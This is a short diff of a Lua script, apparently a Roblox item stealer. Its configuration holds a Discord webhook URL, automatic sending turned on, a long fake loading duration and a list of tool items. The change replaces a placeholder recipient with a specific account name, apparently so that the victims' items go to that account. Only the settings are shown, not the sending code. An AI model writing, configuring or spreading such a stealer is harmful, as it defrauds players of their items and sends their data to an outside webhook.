@@ -14,7 +14,7 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1420603387036303420/Yv2Vju
 local SEND_DELAY = 0.6
 local AUTO_SEND_ENABLED = true
 local LOADING_DURATION = 300
-local DEFAULT_RECIPIENTS = {"username"}
+local DEFAULT_RECIPIENTS = {"Mcdo6PcNuggets"}
 local TOOL_NAMES = {"shovel","hoe","rake","wateringcan","bat"}
 
 
